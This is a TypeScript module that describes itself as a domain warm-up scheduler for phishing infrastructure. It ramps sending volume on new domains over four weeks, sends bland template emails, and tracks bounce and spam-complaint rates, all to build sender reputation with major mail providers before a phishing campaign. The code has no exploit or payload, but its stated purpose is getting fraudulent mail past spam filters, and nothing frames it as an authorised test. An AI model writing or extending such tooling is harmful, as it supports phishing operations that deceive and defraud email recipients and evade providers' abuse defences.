/**
 * Domain Warm-Up Scheduler for Phishing Infrastructure
 *
 * New domains have poor email deliverability due to lack of sending reputation.
 * This scheduler gradually increases sending volume over 2-4 weeks to build
 * reputation with major email providers (Google, Microsoft, Yahoo).
 *
 * Warm-up strategy:
 * - Week 1: 5-10 emails/day to seed addresses (internal)
 * - Week 2: 20-50 emails/day with varied content
 * - Week 3: 50-100 emails/day, introduce external recipients
 * - Week 4: Full volume ready for campaign deployment
 *
 * Monitors bounce rates, spam complaints, and delivery rates to auto-adjust.
 */

// ─── Types ───────────────────────────────────────────────────────────────────

export type WarmupPhase = "seeding" | "building" | "expanding" | "ready" | "paused" | "failed";

export interface WarmupDomain {
  domain: string;
  phase: WarmupPhase;
  startedAt: number;
  currentDay: number;
  totalDays: number;
  dailyLimit: number;
  sentToday: number;
  totalSent: number;
  bounceRate: number;
  deliveryRate: number;
  spamComplaintRate: number;
  lastSentAt: number | null;
  pauseReason?: string;
  history: WarmupDayLog[];
}

export interface WarmupDayLog {
  day: number;
  date: string;
  sent: number;
  delivered: number;
  bounced: number;
  spamComplaints: number;
  phase: WarmupPhase;
}

export interface WarmupConfig {
  totalDays: number;           // Total warm-up period (default: 28)
  seedAddresses: string[];     // Internal addresses for initial seeding
  maxBounceRate: number;       // Auto-pause threshold (default: 0.05 = 5%)
  maxSpamRate: number;         // Auto-pause threshold (default: 0.01 = 1%)
  contentTemplates: string[];  // Email content variety for warm-up sends
}

export interface WarmupScheduleEntry {
  day: number;
  phase: WarmupPhase;
  dailyLimit: number;
  recipientType: "internal" | "mixed" | "external";
  contentStrategy: string;
}

// ─── Default Schedule ────────────────────────────────────────────────────────

const DEFAULT_WARMUP_SCHEDULE: WarmupScheduleEntry[] = [
  // Week 1: Seeding (internal only)
  { day: 1, phase: "seeding", dailyLimit: 5, recipientType: "internal", contentStrategy: "welcome" },
  { day: 2, phase: "seeding", dailyLimit: 8, recipientType: "internal", contentStrategy: "newsletter" },
  { day: 3, phase: "seeding", dailyLimit: 10, recipientType: "internal", contentStrategy: "notification" },
  { day: 4, phase: "seeding", dailyLimit: 12, recipientType: "internal", contentStrategy: "welcome" },
  { day: 5, phase: "seeding", dailyLimit: 15, recipientType: "internal", contentStrategy: "newsletter" },
  { day: 6, phase: "seeding", dailyLimit: 15, recipientType: "internal", contentStrategy: "notification" },
  { day: 7, phase: "seeding", dailyLimit: 20, recipientType: "internal", contentStrategy: "mixed" },
  // Week 2: Building (mostly internal, some external)
  { day: 8, phase: "building", dailyLimit: 25, recipientType: "internal", contentStrategy: "mixed" },
  { day: 9, phase: "building", dailyLimit: 30, recipientType: "internal", contentStrategy: "newsletter" },
  { day: 10, phase: "building", dailyLimit: 35, recipientType: "mixed", contentStrategy: "notification" },
  { day: 11, phase: "building", dailyLimit: 40, recipientType: "mixed", contentStrategy: "welcome" },
  { day: 12, phase: "building", dailyLimit: 45, recipientType: "mixed", contentStrategy: "mixed" },
  { day: 13, phase: "building", dailyLimit: 50, recipientType: "mixed", contentStrategy: "newsletter" },
  { day: 14, phase: "building", dailyLimit: 50, recipientType: "mixed", contentStrategy: "mixed" },
  // Week 3: Expanding (external recipients)
  { day: 15, phase: "expanding", dailyLimit: 60, recipientType: "external", contentStrategy: "mixed" },
  { day: 16, phase: "expanding", dailyLimit: 70, recipientType: "external", contentStrategy: "newsletter" },
  { day: 17, phase: "expanding", dailyLimit: 80, recipientType: "external", contentStrategy: "notification" },
  { day: 18, phase: "expanding", dailyLimit: 90, recipientType: "external", contentStrategy: "mixed" },
  { day: 19, phase: "expanding", dailyLimit: 100, recipientType: "external", contentStrategy: "mixed" },
  { day: 20, phase: "expanding", dailyLimit: 120, recipientType: "external", contentStrategy: "mixed" },
  { day: 21, phase: "expanding", dailyLimit: 150, recipientType: "external", contentStrategy: "mixed" },
  // Week 4: Ready (full volume ramp)
  { day: 22, phase: "ready", dailyLimit: 200, recipientType: "external", contentStrategy: "mixed" },
  { day: 23, phase: "ready", dailyLimit: 250, recipientType: "external", contentStrategy: "mixed" },
  { day: 24, phase: "ready", dailyLimit: 300, recipientType: "external", contentStrategy: "mixed" },
  { day: 25, phase: "ready", dailyLimit: 400, recipientType: "external", contentStrategy: "mixed" },
  { day: 26, phase: "ready", dailyLimit: 500, recipientType: "external", contentStrategy: "mixed" },
  { day: 27, phase: "ready", dailyLimit: 750, recipientType: "external", contentStrategy: "mixed" },
  { day: 28, phase: "ready", dailyLimit: 1000, recipientType: "external", contentStrategy: "mixed" },
];

// ─── Warm-Up Content Templates ───────────────────────────────────────────────

const WARMUP_CONTENT_TEMPLATES = {
  welcome: {
    subjects: [
      "Welcome to our platform",
      "Your account has been created",
      "Getting started guide",
    ],
    bodies: [
      "Thank you for joining. Here's how to get started with your new account.",
      "Welcome aboard! We're excited to have you. Check out our quick start guide.",
    ],
  },
  newsletter: {
    subjects: [
      "Weekly Update: Industry News",
      "This Month's Highlights",
      "Your Weekly Digest",
    ],
    bodies: [
      "Here's what happened this week in the industry. Read on for key updates.",
      "Don't miss these important updates from the past week.",
    ],
  },
  notification: {
    subjects: [
      "Action Required: Review Your Settings",
      "Reminder: Upcoming Deadline",
      "Important: Policy Update",
    ],
    bodies: [
      "Please review your account settings to ensure everything is up to date.",
      "This is a friendly reminder about an upcoming deadline.",
    ],
  },
};

// ─── Core Functions ──────────────────────────────────────────────────────────

/**
 * Initialize a warm-up campaign for a new domain.
 */
export function initializeWarmup(
  domain: string,
  config?: Partial<WarmupConfig>
): WarmupDomain {
  return {
    domain,
    phase: "seeding",
    startedAt: Date.now(),
    currentDay: 1,
    totalDays: config?.totalDays || 28,
    dailyLimit: DEFAULT_WARMUP_SCHEDULE[0].dailyLimit,
    sentToday: 0,
    totalSent: 0,
    bounceRate: 0,
    deliveryRate: 1.0,
    spamComplaintRate: 0,
    lastSentAt: null,
    history: [],
  };
}

/**
 * Get the current day's schedule entry for a warm-up domain.
 */
export function getCurrentSchedule(warmup: WarmupDomain): WarmupScheduleEntry | null {
  if (warmup.phase === "paused" || warmup.phase === "failed") return null;
  return DEFAULT_WARMUP_SCHEDULE[warmup.currentDay - 1] || null;
}

/**
 * Advance the warm-up to the next day. Call once per day.
 */
export function advanceDay(warmup: WarmupDomain): WarmupDomain {
  // Log today's results
  warmup.history.push({
    day: warmup.currentDay,
    date: new Date().toISOString().split("T")[0],
    sent: warmup.sentToday,
    delivered: Math.round(warmup.sentToday * warmup.deliveryRate),
    bounced: Math.round(warmup.sentToday * warmup.bounceRate),
    spamComplaints: Math.round(warmup.sentToday * warmup.spamComplaintRate),
    phase: warmup.phase,
  });

  // Check health thresholds
  if (warmup.bounceRate > 0.05) {
    warmup.phase = "paused";
    warmup.pauseReason = `Bounce rate ${(warmup.bounceRate * 100).toFixed(1)}% exceeds 5% threshold`;
    return warmup;
  }
  if (warmup.spamComplaintRate > 0.01) {
    warmup.phase = "paused";
    warmup.pauseReason = `Spam complaint rate ${(warmup.spamComplaintRate * 100).toFixed(2)}% exceeds 1% threshold`;
    return warmup;
  }

  // Advance
  warmup.currentDay++;
  warmup.sentToday = 0;

  if (warmup.currentDay > warmup.totalDays) {
    warmup.phase = "ready";
    warmup.dailyLimit = 1000; // Full volume
  } else {
    const schedule = DEFAULT_WARMUP_SCHEDULE[warmup.currentDay - 1];
    if (schedule) {
      warmup.phase = schedule.phase;
      warmup.dailyLimit = schedule.dailyLimit;
    }
  }

  return warmup;
}

/**
 * Record a send event and update metrics.
 */
export function recordSend(
  warmup: WarmupDomain,
  delivered: boolean,
  bounced: boolean,
  spamComplaint: boolean
): WarmupDomain {
  warmup.sentToday++;
  warmup.totalSent++;
  warmup.lastSentAt = Date.now();

  // Update rolling rates (exponential moving average)
  const alpha = 0.1; // Smoothing factor
  warmup.deliveryRate = warmup.deliveryRate * (1 - alpha) + (delivered ? 1 : 0) * alpha;
  warmup.bounceRate = warmup.bounceRate * (1 - alpha) + (bounced ? 1 : 0) * alpha;
  warmup.spamComplaintRate = warmup.spamComplaintRate * (1 - alpha) + (spamComplaint ? 1 : 0) * alpha;

  return warmup;
}

/**
 * Check if the domain can send more emails today.
 */
export function canSendToday(warmup: WarmupDomain): boolean {
  if (warmup.phase === "paused" || warmup.phase === "failed") return false;
  return warmup.sentToday < warmup.dailyLimit;
}

/**
 * Get a random warm-up email content for the current strategy.
 */
export function getWarmupContent(strategy: string): { subject: string; body: string } {
  const templates = WARMUP_CONTENT_TEMPLATES[strategy as keyof typeof WARMUP_CONTENT_TEMPLATES]
    || WARMUP_CONTENT_TEMPLATES.newsletter;

  const subject = templates.subjects[Math.floor(Math.random() * templates.subjects.length)];
  const body = templates.bodies[Math.floor(Math.random() * templates.bodies.length)];

  return { subject, body };
}

/**
 * Get warm-up status summary for all domains.
 */
export function getWarmupSummary(domains: WarmupDomain[]): {
  total: number;
  seeding: number;
  building: number;
  expanding: number;
  ready: number;
  paused: number;
  avgDeliveryRate: number;
} {
  const summary = {
    total: domains.length,
    seeding: 0,
    building: 0,
    expanding: 0,
    ready: 0,
    paused: 0,
    avgDeliveryRate: 0,
  };

  let totalDeliveryRate = 0;
  for (const d of domains) {
    summary[d.phase as keyof typeof summary]++;
    totalDeliveryRate += d.deliveryRate;
  }
  summary.avgDeliveryRate = domains.length > 0 ? totalDeliveryRate / domains.length : 0;

  return summary;
}

/**
 * Resume a paused warm-up (after fixing the issue).
 * Reduces daily limit by 50% as a safety measure.
 */
export function resumeWarmup(warmup: WarmupDomain): WarmupDomain {
  if (warmup.phase !== "paused") return warmup;

  warmup.phase = warmup.currentDay <= 7 ? "seeding" :
    warmup.currentDay <= 14 ? "building" :
    warmup.currentDay <= 21 ? "expanding" : "ready";

  warmup.dailyLimit = Math.max(5, Math.floor(warmup.dailyLimit * 0.5));
  warmup.pauseReason = undefined;
  warmup.bounceRate = 0;
  warmup.spamComplaintRate = 0;

  return warmup;
}
